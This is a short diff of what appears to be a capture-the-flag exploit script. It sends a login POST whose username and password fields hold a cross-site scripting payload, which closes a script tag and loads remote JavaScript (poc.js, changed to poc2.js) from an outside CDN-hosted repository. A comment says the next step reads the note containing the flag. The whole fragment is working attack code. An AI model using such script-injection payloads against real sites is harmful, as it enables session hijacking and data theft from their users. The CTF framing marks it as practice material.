@@ -3,8 +3,8 @@
     method: 'POST',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
     body:
-      'username='+encodeURIComponent('"</script><script src=https://cdn.jsdelivr.net/gh/PabloMarrtinez/ctf/poc.js></script><!--')+
-      '&password='+encodeURIComponent('"</script><script src=https://cdn.jsdelivr.net/gh/PabloMarrtinez/ctf/poc.js></script><!--')
+      'username='+encodeURIComponent('"</script><script src=https://cdn.jsdelivr.net/gh/PabloMarrtinez/ctf/poc2.js></script><!--')+
+      '&password='+encodeURIComponent('"</script><script src=https://cdn.jsdelivr.net/gh/PabloMarrtinez/ctf/poc2.js></script><!--')
   });
 
   /* 2️⃣  Lee la nota ( FLAG ) */
